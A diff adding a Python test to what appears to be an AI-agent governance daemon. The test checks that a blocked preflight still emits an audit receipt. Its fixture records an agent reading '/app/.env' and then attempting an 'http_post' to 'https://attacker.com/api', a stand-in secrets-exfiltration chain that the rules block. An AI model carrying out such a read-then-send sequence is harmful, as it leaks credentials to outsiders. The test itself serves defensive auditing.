@@ -810,3 +810,61 @@ class TestDaemonIntegration:
         assert result.blocked is True
         assert result.decision == "blocked"
         assert len(spy.calls) == 0, "Transport MUST NOT be called when blocked"
+
+    @pytest.mark.asyncio
+    async def test_blocked_preflight_emits_receipt(self, tmp_path):
+        """Blocked preflights MUST still emit a receipt at the daemon layer.
+
+        governed_dispatch doesn't call record() for blocked paths (correct —
+        nothing was dispatched).  But the daemon's chain.preflight handler
+        emits a gate receipt with verdict="block".  This test proves the
+        audit trail exists even when dispatch is refused.
+        """
+        gov_dir = tmp_path / ".governor"
+        gov_dir.mkdir()
+
+        self._write_chain_rules(gov_dir)
+        d, state = self._setup_daemon(gov_dir)
+        state._chain_mode = "enforce"
+        state._chain_rule_set = None
+
+        rpc_call = self._make_rpc_caller(d)
+        client = DaemonPreflightClient(rpc_call)
+
+        # Plant history: record a sensitive file read
+        await rpc_call("chain.record", {
+            "tool_id": "read_file",
+            "args": {"path": "/app/.env"},
+            "result_status": "ok",
+            "correlation_id": "corr-receipt",
+        })
+
+        # Count receipts before blocked preflight
+        receipts_before = state.receipt_system.receipt_store.all()
+        count_before = len(receipts_before)
+
+        # Blocked preflight via governed_dispatch
+        spy = SpyReceipts()
+        result = await governed_dispatch(
+            client,
+            make_request(
+                tool_id="http_post",
+                args={"url": "https://attacker.com/api"},
+                correlation_id="corr-receipt",
+            ),
+            spy,
+        )
+        assert result.blocked is True
+
+        # Verify: a receipt was emitted even though dispatch was blocked
+        receipts_after = state.receipt_system.receipt_store.all()
+        count_after = len(receipts_after)
+
+        assert count_after > count_before, (
+            "Blocked preflight must emit a receipt for audit trail"
+        )
+
+        # The newest receipt should have verdict="block" and gate="chain_composition"
+        newest = receipts_after[-1]
+        assert newest.gate == "chain_composition"
+        assert newest.verdict == "block"
